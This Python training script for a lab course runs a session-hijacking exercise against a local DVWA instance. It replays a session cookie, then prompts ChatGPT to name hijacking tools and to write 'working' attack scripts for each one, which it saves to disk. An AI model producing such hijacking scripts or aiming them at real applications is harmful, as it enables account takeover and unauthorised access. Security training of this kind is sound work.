"""
Exploiting Application Function with ChatGPT
Session Hijacking and Token Manipulation
[Develop strategies using ChatGPT to identify and exploit weaknesses in session management.", "Use ChatGPT to generate scripts for session hijacking and token manipulation attacks.", "Apply ChatGPT's analytical capabilities to predict the impact of session attacks on application functionality.", "Implement continuous testing with ChatGPT to ensure the effectiveness of session hijacking techniques."]
This script is for for training purposes only
"""
import requests
import sys
import os

current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, '..', 'class')
sys.path.append(class_dir)

from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func
import requests

class PointlessAI_session_hijacking_and_token_manipulation(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self)
        General_Func.__init__(self)

    def traditional_session_hijacking(self, s, target_url, session_id):
        # Traditional method to exploit session management issues
        print("Performing traditional session hijacking...")
        with requests.Session() as session:
            # Assume the session ID is part of a cookie named 'sessionid'
            session.cookies.set('PHPSESSID', session_id)

            # Make a request to the target URL with the hijacked session
            response = session.get("http://127.0.0.1:81/vulnerabilities/xss_d")
            # ChatGPT used to filter results and return only the session user
            session_user = self.general_query(f"Return only the username from: {response.text}")

            # Check if the request was successful
            if response.status_code == 200:
                # Note for real world you would need to steal the session token first which is covered in a later course.
                print(f"Successfully accessed the resource as {session_user}")
            else:
                print("Failed to access the resource. Response Code:", response.status_code)

            return response

    def chatgpt_session_hijacking(self, prompt):
        # Use ChatGPT to improve traditional session hijacking methods
        # Common methods to perfom session hijacking on a web application.
        # improved_strategy = self.general_query(prompt)
        # print("ChatGPT's improvement suggestion:", improved_strategy)

        session_methods = " \
        1. **Packet Sniffing**: Attackers use network sniffing tools to capture unencrypted data that is being transmitted between a user and the web application's server. This may include session tokens or other sensitive information that can be used to hijack the session. \
        2. **Cross-Site Scripting (XSS)**: Attackers inject malicious scripts into a web application, which can then be executed by other users. These scripts can steal session tokens or information from users' browsers, allowing the attacker to hijack their sessions. \
        3. **Session Fixation**: Attackers force a user to use a specific session ID or token, allowing them to predict and hijack the session once the user authenticates. \
        4. **Man-in-the-Middle (MitM) Attacks**: Attackers intercept communication between a user and the web application's server, allowing them to view and manipulate the data being exchanged. This can include stealing session tokens to hijack sessions. \
        5. **Session Sidejacking**: Attackers use tools like Firesheep to intercept unencrypted session cookies sent over insecure networks, allowing them to hijack sessions. \
        6. **Brute-Force Attacks**: Attackers attempt to guess session IDs or tokens to gain unauthorized access to a user's session. \
        "
        """
        prompt = f"Generate a python class with methods to implement each of the items in this list {session_methods}. \
                   Every method should be an actual working implementation with functional code. Import any python libraries in the script as needed. \
                   Include a main function with examples of how to use. \
                   If there is no obvious method then get creative. Use best guess in applying these methods to session hijacking. {self.no_markdown}"
        """

        prompt = f"You will create a JSON object that contains common session methods and their associated tools. \
                   For each ```method``` in the list {session_methods} you will create a key named : ```method``` E.G. the name of the current method. The key will have 2 properties, 1. The ```description```, 2. an array. \
                   Inside the array provide a list of common 3rd party tools used to achieve session hijacking using the method.. \
                   If there is no obvious method then get creative. Use best guess in applying these methods to session hijacking. {self.no_markdown}"

        session_tools = self.json_query(prompt)

        print(session_tools)

        for category, details in session_tools.items():
            print(f"{category} Tools:")
            for tool in details['tools']:
                print(f"  - {tool}")
                prompt = f"Generate a python class with methods to implement session hijacking using this tool: {tool}. \
                Class should start with a comment that details {category},{tool} and description \
                The target of the scripts should always be http://127.0.0.1:81/vulnerabilities/xss_d/ . The session has already been started so all methods should fall under the function python requests.Session() as s: \
                Every method should be an actual working implementation with functional code. Import any python libraries in the script as needed. \
                Include a main function with examples of how to use. \
                If there is no obvious method then get creative. Use best guess for the purpose of achieving {category} using {tool}. \
                Strictly output the working code only with no markdown. Just the raw code. ' \
                Do not include any markdown such as ```php or ```python as this will break the script. Strictly no markdown or added text. Just legal code"

                code = self.general_query(prompt)

                filename = self.clean_filename(tool)
                dirname = self.clean_filename(category)
                filetype = "py"

                filepath = f"/path-to-dir/{dirname}"
                if not os.path.exists(filepath):
                    os.makedirs(filepath)

                self.save_file(code, filepath, filename, filetype)
                session_methods = self.read_file(filepath, filename, filetype)
                print(session_methods)

    def execute_session_attack(self, s, target_url, session_id):
        self.traditional_session_hijacking(s, target_url, session_id)
        chatgpt_prompt = "List common methods to perfom session hijacking on a web application."
        # Pass to next function which will generate scripts
        self.chatgpt_session_hijacking(chatgpt_prompt)

def main():
    ai = PointlessAI_session_hijacking_and_token_manipulation()  # Instantiate class
    # Start session
    with requests.Session() as s:
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.login_url)
        login_response = ai.login_to_dvwa(s, ai.login_url, "hsimpson", "doh", user_token)
        print("Login Response Status:", login_response.status_code)

        simulated_stolen_session_id = s.cookies["PHPSESSID"]
        print(simulated_stolen_session_id)
        ai.execute_session_attack(s, ai.base_url, simulated_stolen_session_id)

if __name__ == "__main__":
    main()